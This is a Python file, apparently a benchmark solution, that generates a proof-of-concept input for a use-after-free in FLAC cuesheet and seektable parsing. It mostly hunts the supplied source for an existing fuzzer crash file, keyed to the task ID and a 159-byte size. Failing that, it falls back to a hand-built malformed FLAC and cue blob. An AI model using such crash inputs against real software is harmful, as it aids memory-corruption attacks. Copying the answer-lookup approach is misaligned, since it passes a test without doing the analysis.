import os
import re
import tarfile
from typing import Optional, Tuple, List


class Solution:
    def solve(self, src_path: str) -> bytes:
        data = self._find_embedded_poc(src_path)
        if data is not None and len(data) > 0:
            return data
        return self._fallback_poc()

    def _find_embedded_poc(self, src_path: str) -> Optional[bytes]:
        if os.path.isdir(src_path):
            return self._find_embedded_poc_in_dir(src_path)
        if os.path.isfile(src_path):
            return self._find_embedded_poc_in_tar(src_path)
        return None

    def _find_embedded_poc_in_dir(self, root: str) -> Optional[bytes]:
        best: Optional[Tuple[float, str, bytes]] = None
        for dirpath, dirnames, filenames in os.walk(root):
            dirnames[:] = [d for d in dirnames if d not in (".git", ".svn", ".hg", "__pycache__")]
            for fn in filenames:
                p = os.path.join(dirpath, fn)
                try:
                    st = os.stat(p)
                except OSError:
                    continue
                if not os.path.isfile(p):
                    continue
                size = st.st_size
                if size <= 0 or size > 1_000_000:
                    continue
                lp = p.lower()
                if self._is_obvious_source_path(lp):
                    continue
                try:
                    with open(p, "rb") as f:
                        sample = f.read(4096)
                    with open(p, "rb") as f:
                        content = f.read()
                except OSError:
                    continue

                score = self._candidate_score(lp, size, sample)
                if score < 0:
                    continue
                if best is None or score > best[0] or (score == best[0] and len(content) < len(best[2])):
                    best = (score, p, content)

                if self._is_perfect_match(lp, size, sample):
                    return content
        return best[2] if best is not None else None

    def _find_embedded_poc_in_tar(self, tar_path: str) -> Optional[bytes]:
        best: Optional[Tuple[float, str, bytes]] = None
        try:
            with tarfile.open(tar_path, "r:*") as tf:
                members = tf.getmembers()
                for m in members:
                    if not m.isfile():
                        continue
                    if m.size <= 0 or m.size > 1_000_000:
                        continue
                    name = m.name
                    lname = name.lower()
                    if self._is_obvious_source_path(lname):
                        continue
                    f = None
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        sample = f.read(4096)
                        if self._is_perfect_match(lname, m.size, sample):
                            try:
                                if m.size <= len(sample):
                                    return sample[: m.size]
                                f2 = tf.extractfile(m)
                                if f2 is None:
                                    return sample[: m.size]
                                content = f2.read()
                                return content
                            except Exception:
                                return sample[: m.size]
                        score = self._candidate_score(lname, m.size, sample)
                        if score < 0:
                            continue
                        f2 = tf.extractfile(m)
                        if f2 is None:
                            continue
                        content = f2.read()
                        if best is None or score > best[0] or (score == best[0] and len(content) < len(best[2])):
                            best = (score, name, content)
                    except Exception:
                        continue
                    finally:
                        try:
                            if f is not None:
                                f.close()
                        except Exception:
                            pass
        except Exception:
            return None
        return best[2] if best is not None else None

    def _is_obvious_source_path(self, lname: str) -> bool:
        if any(part in lname for part in ("/.git/", "/.svn/", "/.hg/", "/__pycache__/")):
            return True
        base = os.path.basename(lname)
        ext = os.path.splitext(base)[1]
        if ext in {
            ".c",
            ".h",
            ".cc",
            ".cpp",
            ".cxx",
            ".hh",
            ".hpp",
            ".hxx",
            ".m4",
            ".am",
            ".ac",
            ".cmake",
            ".mk",
            ".make",
            ".in",
            ".sh",
            ".py",
            ".java",
            ".js",
            ".ts",
            ".go",
            ".rs",
            ".rb",
            ".php",
            ".pl",
            ".cs",
            ".swift",
            ".kt",
            ".kts",
            ".patch",
            ".diff",
            ".md",
            ".rst",
            ".adoc",
            ".txt",
            ".html",
            ".css",
            ".yml",
            ".yaml",
            ".json",
            ".toml",
            ".ini",
            ".cfg",
            ".conf",
            ".ninja",
            ".bat",
            ".ps1",
            ".rc",
            ".def",
            ".spec",
            ".podspec",
            ".gradle",
            ".sln",
            ".vcxproj",
            ".dsp",
            ".dsw",
            ".xcodeproj",
        }:
            if ext == ".txt":
                if any(k in lname for k in ("clusterfuzz", "testcase", "crash", "poc", "repro", "oss-fuzz")):
                    return False
                return True
            return True
        if base in {"readme", "license", "copying", "changelog", "news", "authors", "install"}:
            return True
        return False

    def _is_perfect_match(self, lname: str, size: int, sample: bytes) -> bool:
        if size == 159:
            if any(k in lname for k in ("clusterfuzz-testcase-minimized", "clusterfuzz", "testcase-minimized")):
                return True
            if sample.startswith(b"fLaC"):
                return True
            if b"TRACK" in sample and b"INDEX" in sample and b"FILE" in sample:
                return True
        if any(k in lname for k in ("arvo:61292", "61292")) and 0 < size <= 4096:
            return True
        return False

    def _candidate_score(self, lname: str, size: int, sample: bytes) -> float:
        base = os.path.basename(lname)
        ext = os.path.splitext(base)[1]

        if ext in {".tar", ".gz", ".xz", ".bz2", ".zip", ".7z", ".rar", ".zst"}:
            return -1.0

        score = 0.0
        kws = [
            ("clusterfuzz-testcase-minimized", 2500),
            ("clusterfuzz", 1800),
            ("testcase", 1200),
            ("minimized", 1100),
            ("repro", 900),
            ("poc", 900),
            ("crash", 850),
            ("oss-fuzz", 700),
            ("asan", 600),
            ("use-after-free", 600),
            ("uaf", 450),
            ("cuesheet", 300),
            ("seekpoint", 300),
            ("metaflac", 250),
            ("flac", 150),
            ("61292", 2000),
            ("arvo", 500),
        ]
        for k, w in kws:
            if k in lname:
                score += w

        if ext in {".flac", ".cue", ".bin", ".dat", ".raw", ".input"}:
            score += 250

        if sample.startswith(b"fLaC"):
            score += 900
        if sample.startswith(b"RIFF") and (b"WAVE" in sample[:64]):
            score += 250

        if size == 159:
            score += 1100
        elif 0 < size < 512:
            score += 200
        elif size <= 4096:
            score += 60

        printable = 0
        nul = 0
        for b in sample[:512]:
            if b == 0:
                nul += 1
            if 32 <= b <= 126 or b in (9, 10, 13):
                printable += 1
        ratio = printable / max(1, min(len(sample), 512))
        if nul > 0:
            score += 50
        if ratio > 0.98 and ext not in {".cue"}:
            if not (b"TRACK" in sample and b"INDEX" in sample and b"FILE" in sample):
                score -= 600

        score += max(0.0, 600.0 - (size / 4.0))

        if score < 0:
            return -1.0
        return score

    def _fallback_poc(self) -> bytes:
        flac = self._minimal_flac_with_empty_seektable()
        cue = (
            b'FILE "a" WAVE\n'
            b'  TRACK 01 AUDIO\n'
            b'    INDEX 01 00:00:00\n'
        )
        blob = flac + cue
        if len(blob) < 159:
            blob += b"\n" + (b"A" * (159 - len(blob) - 1))
        return blob[:512]

    def _minimal_flac_with_empty_seektable(self) -> bytes:
        sig = b"fLaC"

        # STREAMINFO block (type 0), length 34
        # min/max blocksize: 16
        # min/max framesize: 0
        # sample_rate: 44100, channels: 2, bps: 16, total_samples: 0
        # md5: 16x0
        min_block = 16
        max_block = 16
        min_frame = 0
        max_frame = 0
        sample_rate = 44100
        channels_minus1 = 1
        bps_minus1 = 15
        total_samples = 0
        md5 = b"\x00" * 16

        si = bytearray()
        si += min_block.to_bytes(2, "big")
        si += max_block.to_bytes(2, "big")
        si += min_frame.to_bytes(3, "big")
        si += max_frame.to_bytes(3, "big")

        x = (sample_rate & 0xFFFFF) << 44
        x |= (channels_minus1 & 0x7) << 41
        x |= (bps_minus1 & 0x1F) << 36
        x |= (total_samples & 0xFFFFFFFFF)
        si += x.to_bytes(8, "big")
        si += md5
        si = bytes(si[:34])

        streaminfo_header = bytes([0x00]) + (34).to_bytes(3, "big")

        # SEEKTABLE block (type 3), last-metadata-block = 1, length 0
        seektable_header = bytes([0x80 | 0x03]) + (0).to_bytes(3, "big")

        return sig + streaminfo_header + si + seektable_header